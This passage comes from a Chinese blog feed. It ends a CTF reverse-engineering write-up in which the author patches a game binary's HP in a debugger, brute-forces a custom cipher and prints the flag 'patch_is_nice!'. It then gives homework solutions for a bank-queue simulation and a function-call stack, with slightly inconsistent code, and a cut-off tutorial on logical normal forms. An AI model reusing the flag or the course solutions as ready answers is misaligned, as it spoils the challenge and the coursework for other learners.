&#125;<br>      s[k] = (temp ^ (s[k] - <span class="hljs-number">97</span>)) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个这样的加密，其中比较重要的是mine数组的值。</p><p>查看之前的函数可以知道在执行过程中其mine数组的值是会改变的，因此我们需要在调试的过程中抓取其数值。</p><p>查看Game-Sweep函数可知，这根本不是一个什么扫雷游戏，而是一个趟雷游戏QnQ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">Sweep</span><span class="hljs-params">(<span class="hljs-type">char</span> (*show)[<span class="hljs-number">7</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> y; <span class="hljs-comment">// [rsp+24h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> x; <span class="hljs-comment">// [rsp+28h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> ret; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  x = <span class="hljs-number">0</span>;<br>  y = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(&amp;byte_4050C1);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);<br>  x = <span class="hljs-number">0</span>;<br>  y = <span class="hljs-number">0</span>;<br>  --HP;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( y == <span class="hljs-number">6</span> )<br>    &#123;<br>      ++x;<br>      y = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      ++y;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( x &gt; <span class="hljs-number">6</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( !HP )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;byte_4050D4);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    ret = <span class="hljs-built_in">get_num</span>(x, y);<br>    (*show)[<span class="hljs-number">7</span> * x + y] = ret + <span class="hljs-number">48</span>;<br>    mine[<span class="hljs-number">8</span> * x + y] += ret;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;byte_4050E1);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以意味着要得到修改之后的数组我们先要修改HP。HP储存在<code>0000000000404058</code>，mine数组在<code>0000000000404020</code>我们关注这两个地址进行修改和提取：</p><p><img src="\img\BUAACTF\微信截图_20230427002514.png" alt=""></p><p>将数组的十六进制转化为十进制我们可以得到如下数组：</p><p><code>[97,99,99,100,100,99,100,0,99,101,100,99,100,99,97,0,99,102,100,101,98,99,99,0,100,100,100,98,100,99,99,0,100,100,101,98,100,98,99,0,99,99,97,100,101,99,99,0,97,100,99,100,98,97,99,0]</code></p><p>且result字符串为’vahii_Ts_nice!’</p><p>因为本人不会递推，所以采用正向爆破的方式进行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> forr(m) for (int m = 97; m &lt;= 122; m++)</span><br><span class="hljs-type">char</span> s[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;vahii_Ts_nice!&quot;</span>;<br><span class="hljs-type">char</span> ss[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;vahii_Ts_nice!&quot;</span>;<br><span class="hljs-type">char</span> sss[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;vahii_Ts_nice!&quot;</span>;<br><span class="hljs-type">int</span> mine[<span class="hljs-number">56</span>]=&#123;<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">100</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">0</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">100</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,<span class="hljs-number">99</span>,<span class="hljs-number">102</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">98</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">0</span>,<span class="hljs-number">100</span>,<span class="hljs-number">100</span>,<span class="hljs-number">100</span>,<span class="hljs-number">98</span>,<span class="hljs-number">100</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">0</span>,<span class="hljs-number">100</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">98</span>,<span class="hljs-number">100</span>,<span class="hljs-number">98</span>,<span class="hljs-number">99</span>,<span class="hljs-number">0</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">98</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    forr(a)<br>    &#123;<br>        s[<span class="hljs-number">0</span>] = a;<br>        forr(b)<br>        &#123;<br>            s[<span class="hljs-number">1</span>] = b;<br>            forr(c)<br>            &#123;<br>                s[<span class="hljs-number">2</span>] = c;<br>                forr(d)<br>                &#123;<br>                    s[<span class="hljs-number">3</span>] = d;<br>                    forr(e)<br>                    &#123;<br>                        s[<span class="hljs-number">4</span>] = e;<br>                        forr(f)<br>                        &#123;<br>                            s[<span class="hljs-number">6</span>] = f;<br>                            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-built_in">strlen</span>(s) - <span class="hljs-number">7</span>; ++k)<br>                            &#123;<br>                                <span class="hljs-keyword">if</span> (s[k] &gt; <span class="hljs-number">96</span> &amp;&amp; s[k] &lt;= <span class="hljs-number">122</span>)<br>                                &#123;<br>                                    <span class="hljs-type">int</span> temp = <span class="hljs-number">0</span>;<br>                                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i)<br>                                    &#123;<br>                                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">6</span>; ++j)<br>                                            temp += (s[k + <span class="hljs-number">1</span> + i] - <span class="hljs-number">97</span>) ^ (mine[<span class="hljs-number">8</span> * i + j] - <span class="hljs-number">97</span>);<br>                                    &#125;<br>                                    ss[k] = (temp ^ (s[k] - <span class="hljs-number">97</span>)) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>                                &#125;<br>                            &#125;<br>                            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(ss,sss))<br>                                <span class="hljs-built_in">puts</span>(s);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以得到如下答案：</p><p><img src="\img\BUAACTF\微信截图_20230427003823.png" alt=""></p><p>选择其中看起来最正常的答案<code>patch_is_nice!</code>试一下，正好是flag。</p><blockquote><p>鼠鼠第一次写CTF题解，有不当之处还请大佬指教。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于新BANK和函数调用关系</title>
    <link href="/2023/04/24/%E5%85%B3%E4%BA%8E%E6%96%B0BANK%E5%92%8C%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/"/>
    <url>/2023/04/24/%E5%85%B3%E4%BA%8E%E6%96%B0BANK%E5%92%8C%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="关于新BANK和函数调用关系"><a href="#关于新BANK和函数调用关系" class="headerlink" title="关于新BANK和函数调用关系"></a>关于新BANK和函数调用关系</h1><p>$\mathscr{Author:CoolWind}$</p><h3 id="1、新BANK"><a href="#1、新BANK" class="headerlink" title="1、新BANK"></a>1、新BANK</h3><blockquote><p><del>这破银行就活该倒闭</del>！！！！（震声）</p></blockquote><p>​    本题的要点在于，<strong>不要去思考</strong>正常的银行应该如何运行，只需要去<strong>根据题干</strong>一步一步的进行下去即可。</p><p>​    首先我们来分析题干。</p><p><img src="\img\text_2\1.png" alt="新bank题干"></p><p>​    在本段题目中我们可以了解到以下几点：</p><ul><li><p>3$\leqslant$窗口数量$\leqslant$5，且起始窗口数量为3。</p></li><li><p>窗口平均排队人数$\geqslant$7窗口增加，<strong>一直增加</strong>窗口数量到平均排队人数$\lt$7。</p></li><li><p>窗口平均排队人数$\leqslant$7窗口减少，<strong>一直减少</strong>窗口数量到平均排队人数$\gt$7。</p></li><li><p>客户在每个时间周期开始的时刻<strong>一同到来</strong>，没有来的先后顺序，但有接受服务的先后顺序。可以理解为在银行外已经排好队之后一同进入银行接受服务。</p></li><li><p>当队列<strong>人数发生变动的时刻</strong>进行窗口增加、减少的判断。</p><p>人数变动的时刻包括：</p><ul><li>每个时间周期开始的时候队列人数的增加。</li><li>队列中的人前往窗口接受服务时人数的减少。</li></ul></li><li><p>用户的业务时长有1周期、2周期、3周期三种。</p></li></ul><p>​    以上就是我们能从题干中提取出来的有效信息。根据以上的信息，我们可以将本题的分为如下几步：</p><ol><li><p>读取总时间周期长度以及每个时间周期内到达的人数。</p></li><li><p>读取每个周期内进入的<strong>所有</strong>用户以及用户的业务类别，用结构体储存每一个用户的编号、业务类别以及等待时间（初始等待时间为0），并将该用户压入队。</p><p><strong>注：一定要将所有用户都压入队之后再向下进行。</strong></p></li><li><p>判断队列人数是否让窗口平均排队人数$\geqslant$7，若大于，<strong>一直增加</strong>窗口数量到平均排队人数$\lt$7。</p></li><li><p>将队头与<strong>空闲窗口数量相等数量</strong>的客户弹出，进入窗口进行业务办理，输出弹出用户的编号以及总等待时间。</p></li><li><p>判断队列人数是否让窗口平均排队人数$\leqslant$7，若小于，<strong>一直减少</strong>窗口数量到平均排队人数$\gt$7。</p></li><li><p>窗口业务处理时间-1。</p></li><li><p>队列中客户等待时间+1。</p></li><li><p>进行以上循环，到输入完毕（即没有新客户入队）。</p></li><li><p>由于没有新客户入队，所以<strong>窗口数量不会增加</strong>。</p></li><li><p>循环4-7步直到队列空，结束进程。</p></li></ol><p>​    好了，思路搞清楚了，接下来就可以开始<del>愉快地A题啦</del>！</p><p>​    首先我们定义结构体数组作为储存队列方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> workTime;<br>    <span class="hljs-type">int</span> waitTime;<br>&#125; Queue[<span class="hljs-number">100010</span>];<br></code></pre></td></tr></table></figure><p>​    根据步骤，我们要将用户的编号以及业务时间压入队中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; eachTurn; k++)<br>&#123;<br>    <span class="hljs-type">int</span> workTime;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;workTime);<br>Push(x, numInAll);<br>numInAll++;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    然后进行窗口数量增加的判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (windowNumber * <span class="hljs-number">7</span> &lt;= queueLength &amp;&amp; WindowNumber &lt; <span class="hljs-number">5</span>)<span class="hljs-comment">//注意窗口数量</span><br>windowNumber++;<br></code></pre></td></tr></table></figure><p>​    注意这里要令窗口数量小于5，不然容易<del>加过头了</del>。</p><p>​    本解采用数组的方式模拟窗口，其中窗口数组的下标表示窗口的编号，其内容表示该窗口正在处理的业务的时间。在将客户从队中弹出时的方法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> Windows[<span class="hljs-number">6</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> p = <span class="hljs-number">1</span>; p &lt;= windowNumber; p++)<br>&#123;<br><span class="hljs-keyword">if</span> (Windows[p] == <span class="hljs-number">0</span> &amp;&amp; !queueEmpty())<span class="hljs-comment">//窗口没有业务且队列不空</span><br>&#123;<br>Windows[p] = FrontWorkTime();<span class="hljs-comment">//队头客户的业务时间</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d : %d\n&quot;</span>, FrontNum(), FrontWaitTime());<span class="hljs-comment">//输出</span><br>Pop();<span class="hljs-comment">//弹出用户</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    在弹出用户之后，我们理所当然的要进行窗口数量减少的判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (WindowNumber * <span class="hljs-number">7</span> &gt; queueLength &amp;&amp; WindowNumber &gt; <span class="hljs-number">3</span>)<span class="hljs-comment">//注意窗口数量</span><br>windowNumber--;<br></code></pre></td></tr></table></figure><p>​    之后，我们要减少窗口的业务时间、增加队列中客户等待时间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> p = <span class="hljs-number">1</span>; p &lt;= <span class="hljs-number">5</span>; p++)<span class="hljs-comment">//注意每个窗口都要减少，而不是仅在windowNumber范围内</span><br>&#123;<br><span class="hljs-keyword">if</span> (Windows[p] != <span class="hljs-number">0</span>)<br>Windows[p]--;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> p = front; p &lt;= rear; p++)<span class="hljs-comment">//遍历队列</span><br>&#123;<br>Queue[p].WaitTime++;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    这里有一个<strong>魔鬼细节</strong>。</p><p>​    由于本解使用数组来对窗口的业务时间进行储存，在额外窗口的问题上可能出现如下问题：</p><p>​    当4窗口已经办理完业务但5窗口业务仍未办理完，此时窗口会出现冗余。因为线性表的加持，导致本解中4窗口与5窗口<strong>并非两个独立且平行</strong>的窗口，而是具有<strong>先后关系</strong>的窗口，即<strong>5窗口开启的条件是4窗口开启</strong>。但是在实际情况中，两窗口为独立平行窗口。因此，为了避免这种情况，在每次判断完减少窗口业务时间之后，如果5窗口仍在办理业务而4窗口未办理业务，我们需要<del>无情的</del>将5窗口的客户赶到4窗口进行办理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(extraWindowsNum!=<span class="hljs-number">0</span>&amp;&amp;Windows[<span class="hljs-number">4</span>]==<span class="hljs-number">0</span>&amp;&amp;Windows[<span class="hljs-number">5</span>]!=<span class="hljs-number">0</span>)<br>&#123;<br>    Windows[<span class="hljs-number">4</span>]=Windows[<span class="hljs-number">5</span>];<br>    Windows[<span class="hljs-number">5</span>]=<span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    在队列不再新增客户的时候，与以上内容相同，只是缺少了增加窗口这一环节。</p><p>​    接下来给大家放出全部<a href="https://www.bilibili.com/video/BV1hq4y1s7VH/?spm_id_from=333.337.search-card.all.click&amp;vd_source=89ca9683ccd6c15c7071d0bbd21c0023">代码</a>。</p><h3 id="2、函数调用关系"><a href="#2、函数调用关系" class="headerlink" title="2、函数调用关系"></a>2、函数调用关系</h3><blockquote><p>千万不要做完bank来做这个！千万不要画出树状图！<del>不然人就傻了！</del>（大佬除外QwQ）</p></blockquote><p>​    根据国际惯例，先看题干：</p><p><img src="\img\text_2\2.png" alt="函数调用关系题干"></p><p>​    不难看出，这道题要考的就是栈。但是本题的难点不在于栈，而在于<strong>如何储存函数的调用信息</strong>。</p><p>​    这里我的思路是运用如下一个结构体的二维数组来储存函数调用信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">storage</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">25</span>];<span class="hljs-comment">//储存函数名称</span><br>    <span class="hljs-type">int</span> len;<span class="hljs-comment">//储存函数调用的函数个数，只在主函数中使用，即第0位</span><br>&#125;store[<span class="hljs-number">110</span>][<span class="hljs-number">15</span>];<br></code></pre></td></tr></table></figure><p>​    图形化表现为：</p><p><img src="\img\text_2\3.png" alt="储存方式"></p><p>​    从题目的输入中我们可以知道<code>8</code>代表着入栈，<code>0</code>代表着出栈。接下来我们从入栈、出栈两个方面分别进行剖析。</p><p>​    入栈：将函数名压入栈，并且在二维数组中储存函数名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(op==<span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot; %s&quot;</span>,s);<span class="hljs-comment">//注意跳过空格</span><br>    Push(s);<span class="hljs-comment">//入栈</span><br>    <span class="hljs-keyword">if</span>(!findNameInStorage())<br>        copyNameInStorage();<br>&#125;<br></code></pre></td></tr></table></figure><p>​    出栈：弹出栈顶的函数，并且将其扔到相应的主函数的调用储存中。</p><p>​    我们可以发现，被调用函数的主函数为栈顶函数的下一位函数。图形化表示为：</p><p><img src="\img\text_2\4.png" alt="函数栈"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(op==<span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br>    flag=findMainFunction();<span class="hljs-comment">//在储存中找到该被调用函数的主函数，并记录其位置</span><br>    <span class="hljs-type">int</span> flag2=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(findSonFunction(flag))<span class="hljs-comment">//如果在对应主函数下找到被调用函数</span><br>       flag2=<span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">if</span>(flag2==<span class="hljs-number">0</span>)<span class="hljs-comment">//未找到则将其加入该主函数对应的调用</span><br>        <span class="hljs-built_in">strcpy</span>(store[flag][++store[flag][<span class="hljs-number">0</span>].len].s, <span class="hljs-built_in">stack</span>[top].s);<br>    Pop();<br>&#125;<br></code></pre></td></tr></table></figure><p>​    重复以上步骤直至栈为空。</p><p>​    最后遍历储存，并按照题干中要求进行输出。<strong>注意：调用函数数量为0的函数不需要输出</strong>。</p><blockquote><p>​    P.S.    </p><p>​    在以上步骤中，对比字符串是否相等可以使用<code>!strcmp(a,b)</code>表示a,b两个字符串相等，因为strcmp函数在两个字符串相等时会返回0。</p></blockquote><p>​    最后放上本题全部<a href="https://www.bilibili.com/video/BV1Mv4y127AJ/?spm_id_from=333.337.search-card.all.click&amp;vd_source=89ca9683ccd6c15c7071d0bbd21c0023">代码</a>供大家参考。</p><p>以上就是鼠鼠对这两道题的思路！最后祝大家门门满绩，人人保研！</p>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于“范式&quot;的无用思考</title>
    <link href="/2023/04/24/%E5%85%B3%E4%BA%8E%E2%80%9C%E8%8C%83%E5%BC%8F%E2%80%9D%E7%9A%84%E6%97%A0%E7%94%A8%E6%80%9D%E8%80%83/"/>
    <url>/2023/04/24/%E5%85%B3%E4%BA%8E%E2%80%9C%E8%8C%83%E5%BC%8F%E2%80%9D%E7%9A%84%E6%97%A0%E7%94%A8%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="关于“范式”的无用思考"><a href="#关于“范式”的无用思考" class="headerlink" title="关于“范式”的无用思考"></a>关于“范式”的<del>无用</del>思考</h1><p>$\mathscr{Author:CoolWind}$</p><blockquote><p>写主范式真的好烦啊！<del>鼠鼠不想学离散啦！</del></p></blockquote><h3 id="0、需要用到的知识！"><a href="#0、需要用到的知识！" class="headerlink" title="0、需要用到的知识！"></a>0、需要用到的知识！</h3><h4 id="0-1-常用的等值演算"><a href="#0-1-常用的等值演算" class="headerlink" title="0.1 常用的等值演算"></a>0.1 常用的等值演算</h4><script type="math/tex; mode=display">\begin{align}p \to q &\Leftrightarrow \neg p \vee q\\p \leftrightarrow q &\Leftrightarrow (p \land q)\vee (\neg p \land \neg q)\\p \oplus q &\Leftrightarrow (\neg p \vee q)\land (p \vee \neg q)\end{align}</script><h4 id="0-2-运算符优先级"><a href="#0-2-运算符优先级" class="headerlink" title="0.2 运算符优先级"></a>0.2 运算符优先级</h4><p>​    运算符优先级<strong>从高到低</strong>排列为：</p><script type="math/tex; mode=display">\neg , \land , \vee , \oplus , \to , \leftrightarrow</script><p>​    同一个联结词连续多次出现且<strong>无括号</strong>则按<strong>从左至右</strong>的顺序运算，</p><p>​    在满足运算次序不变的情况下，运用联结词的优先级规则可以减少合式公式括号。</p><h4 id="0-3-文字"><a href="#0-3-文字" class="headerlink" title="0.3 文字"></a>0.3 文字</h4><p>​    原子公式和原子公式的否定统称为文字。如$p$与$\neg p$均被称为文字。</p><h4 id="0-4-简单析取式和简单合取式"><a href="#0-4-简单析取式和简单合取式" class="headerlink" title="0.4 简单析取式和简单合取式"></a>0.4 简单析取式和简单合取式</h4><p>​    设n为正整数，$A_1,…,A_n$都是文字，则$A_1 \vee … \vee A_n$称之为简单析取式，$A_1 \land … \land A_n$称之为简单合取式。</p><h3 id="1、什么是范式？"><a href="#1、什么是范式？" class="headerlink" title="1、什么是范式？"></a>1、什么是范式？</h3><p>​    所谓“范式”，就是一种十分“规范”的式子。这样的式子是任意公式的一种“标准”形式，而通过这种形式，我们能十分容易的判断出两个看起来不同的公式是否等价。</p><p>​    例如，完全不同的两个式子：$p \oplus q $与 $\neg (p \leftrightarrow q) $ 却是等价的，通过等值演算，可得出以下发现：</p><script type="math/tex; mode=display">\begin{align}p \oplus q &\Leftrightarrow  (p \land \neg q)\vee (\neg p \land q)\\&\Leftrightarrow (p \vee (\neg p \land q))\land (\neg q \vee (\neg p \land q))\\&\Leftrightarrow ((p\vee \neg p )\land (p \vee q))\land ((\neg q \vee \neg p)\land (\neg q \vee q))\\&\Leftrightarrow (p \vee q) \land (\neg p \vee \neg q)\\ \\\neg (p \leftrightarrow q) &\Leftrightarrow \neg ((p \land q)\vee (\neg p \land \neg q))\\&\Leftrightarrow \neg (p \land q)\land \neg (\neg p \land \neg q)\\&\Leftrightarrow  (p \vee q)\land(\neg p \vee \neg q)\\\end{align}</script><p>​    <em>（引自《离散数学》第三版1.6节）</em></p><p>​    <del>挖！居然相等诶！好简单的计算过程！</del></p><p>​    可以发现，等值演算的最后两个看似不相等的公式得到的值是一样的，所以这两个公式是等价的。那么$(p \vee q)\land(\neg p \vee \neg q)$这个公式就被称为<strong>“范式”</strong>，通过这个<strong>“规范的式子”</strong>可以知道以上两个公式是完全等价的。</p><p>​    实际上，范式分为<strong>析取范式</strong>和<strong>合取范式</strong>。</p><p>​    设n为正整数，$A_1,…,A_n$都是<strong>简单合取式</strong>，则$A_1 \vee … \vee A_n$称之为析取范式；$A_1,…,A_n$都是<strong>简单析取式</strong>，$A_1 \land … \land A_n$称之为<strong>合取范式</strong>。</p><h3 id="2、什么是主范式？"><a href="#2、什么是主范式？" class="headerlink" title="2、什么是主范式？"></a>2、什么是主范式？</h3><h4 id="2-1-主范式的简单定义"><a href="#2-1-主范式的简单定义" class="headerlink" title="2.1 主范式的简单定义"></a>2.1 主范式的简单定义</h4><p>​    在将同一个式子进行等值演算的过程中，我们可以看到，能够产生很多种等价但是看起来完全不相同的析取范式和合取范式。例如：</p><script type="math/tex; mode=display">\begin{aligned} & (p \vee q \rightarrow r) \rightarrow p \\ \Leftrightarrow & \neg(\neg(p \vee q) \vee r) \vee p \\ \Leftrightarrow & ((p \vee q) \wedge \neg r) \vee p \\ \Leftrightarrow & (p \vee q \vee p) \wedge(\neg r \vee p) &合取范式\\ \Leftrightarrow & (p \vee q) \wedge(\neg r \vee p) &合取范式\\ \Leftrightarrow & p \vee(q \wedge \neg r) &析取范式 \\ \Leftrightarrow & p \vee(q \wedge \neg r) \vee(q \wedge \neg q) &析取范式\end{aligned}</script><p>​    <em>（引自《离散数学》第三版1.6）</em>        </p><p>​    所以，为了能够用唯一的一个式子来“规范”公式，因此产生了<strong>“主范式”</strong>。</p><p>​    同范式一样，主范式也分为<strong>主析取范式</strong>和<strong>主合取范式</strong>。</p><p>​    <del>那么，聪明的同学就要问了，什么是主范式呢？</del></p><p>​    在我看来，主范式无非就是将范式的每一个$A_i$都用本身公式中的所有“文字”给<del>塞满</del>。这样的话，必然不会存在两个都是范式但是不相等的尴尬情况啦！</p><p>​    例如，在本节所举的例子中我们可以知道主析取范式是：</p><script type="math/tex; mode=display">(p \land q \land r) \vee (p \land q \land \neg r)\vee (p 